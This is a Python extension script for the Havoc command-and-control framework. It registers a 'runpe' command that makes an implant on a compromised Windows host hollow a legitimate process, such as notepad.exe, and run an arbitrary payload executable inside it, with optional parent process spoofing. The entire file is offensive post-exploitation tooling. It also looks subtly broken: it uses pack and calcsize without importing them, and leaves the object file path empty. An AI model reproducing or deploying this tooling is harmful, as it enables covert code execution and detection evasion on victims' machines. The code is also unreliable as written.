from havoc import Demon, RegisterCommand, RegisterModule
from os.path import exists

class Packer:
    def __init__(self):
        self.buffer: bytes = b''
        self.size: int = 0

    def getbuffer(self):
        return pack("<L", self.size) + self.buffer

    def addbytes(self, b):
        if b is None:
            b = b''
        fmt = "<L{}s".format(len(b))
        self.buffer += pack(fmt, len(b), b)
        self.size += calcsize(fmt)

    def addstr(self, s):
        if s is None:
            s = ''
        if isinstance(s, str):
            s = s.encode("utf-8")
        fmt = "<L{}s".format(len(s) + 1)
        self.buffer += pack(fmt, len(s) + 1, s)
        self.size += calcsize(fmt)

    def addint(self, dint):
        self.buffer += pack("<i", dint)
        self.size += 4

def RunPE( demon_id, *args ):
    demon               = Demon( demon_id )
    task_id: str        = None
    packer: Packer      = Packer()
    hollow_target: str  = None
    ppid: int           = None
    exe_path: str       = None
    exe_payload: bytes  = None
    object_file_path    = ""
    
    if demon.ProcessArch == 'x86':
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "x86 is not supported" )
        return False

    if ( len( args ) not in ( 2,3,4 ) ):
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough arguments" )
        return False
    
    hollow_target   = args[0]
    exe_path        = args[1]
    cwd             = "C:\\Windows\\System32"
    ppid            = 0

    if len( args ) == 3:
        try:
            ppid = int(args[2])
        except ValueError:
            try:
                cwd = str(args[2])
            except ValueError:
                demon.ConsoleWrite( demon.CONSOLE_ERROR, f"An invalid data type was given for argument 3 ({args[2]}). Expected string or int.")
                return False
    
    if len( args ) == 4:
        try:
            cwd = str(args[2])
            ppid = int(args[3])
        except ValueError:
            demon.ConsoleWrite( demon.CONSOLE_ERROR, "Third argument must be string for current working directory & fourth argument integer for parent process id." )
            return False
    
    if not exists( exe_path ):
        demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Invalid executable path: { exe_path }" )
        return False

    with open( exe_path, 'rb' ) as file:
        exe_payload = file.read()

    if not exe_payload:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, f"No executable data was provided in { exe_payload }" )
        return False

    packer.addstr( hollow_target )
    packer.addstr( cwd )
    packer.addint( ppid )
    packer.addbytes( exe_payload )    
    
    message = f"Tasked demon to execute RunPE BOF against {hollow_target} with {exe_path} [{len(exe_payload)}] bytes"
    message += f" with current working directory '{cwd}'"
    message += f" spoofing parent as pid {ppid}" if ppid != 0 else ""
    task_id = demon.ConsoleWrite( demon.CONSOLE_TASK, message)
    
    demon.InlineExecute(task_id, "go", object_file_path, packer.getbuffer(), False )

    return task_id

description = """A BOF to execute a PE file in the address space of a remote process
\t         using the process hollowing technique. Supports parent proces spoofing."""
RegisterCommand( RunPE, "", "runpe", description, 0, "[/path/to/hollow] [/path/to/payload] (cwd) (ppid)", "c:\\windows\\system32\\notepad.exe /tmp/payload.exe C:\\Windows\\Temp 1234" )